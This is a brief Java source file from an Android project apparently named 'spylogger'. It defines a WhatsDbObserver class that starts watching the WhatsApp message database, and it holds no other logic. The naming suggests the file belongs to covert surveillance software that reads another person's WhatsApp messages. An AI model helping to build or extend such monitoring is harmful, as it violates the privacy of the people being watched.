package com.gravatasufoca.spylogger.observers;

import android.content.Context;

import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperWhatsApp;

/**
 * Created by bruno on 21/04/17.
 */

public class WhatsDbObserver extends DbObserver{

    public WhatsDbObserver(Context context) {
        super(context);
    }

    @Override
    public void observe() {
        start(getClass(),DatabaseHelperWhatsApp.DATABASE_NAME);
    }
}
